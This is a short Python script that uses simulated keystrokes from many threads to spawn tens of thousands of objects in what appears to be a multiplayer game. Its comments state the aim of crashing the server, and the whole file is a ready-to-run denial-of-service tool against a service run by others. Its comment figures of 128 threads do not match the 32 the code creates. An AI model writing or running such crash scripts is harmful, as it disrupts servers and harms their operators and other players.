import time
import threading
from pynput.keyboard import Controller as KeyboardController

controller = KeyboardController()
threads = []
time.sleep(5)
try:
    for i in range(32):
        # 128 threads x 400 balls = 51,200 balls
        #    (5,000 balls x 10 ==> 2,500mspt x 10 ==> 25,000mspt?)
        #    server would probably crash before measurement
        #
        # possible side effects:
        #   maybe socket time out
        #   possibly the most powerful crash possible
        #   maybe cant run all 128 threads due to processor limitations?
        #   irregularity using exec() functions
        exec(f"""
def ballcrashsegment{i}():
    for _ in range(1600):
        controller.tap("c")
        controller.tap("h")""")
        exec(f"print(f'Creating thread {i}')")
        exec(f"threads.append(threading.Thread(target = ballcrashsegment{i}, daemon = True))")

    controller.press("`")
    start = time.time()
    for i in range(32):
        exec(f"print(f'Starting thread {i}')")
        exec(f"threads[{i}].start()")
    print(f"Time taken: {round((time.time()-start)*1000, 3)}ms")
    controller.release("`")
except Exception as e:
    print(f"Exception as {e}")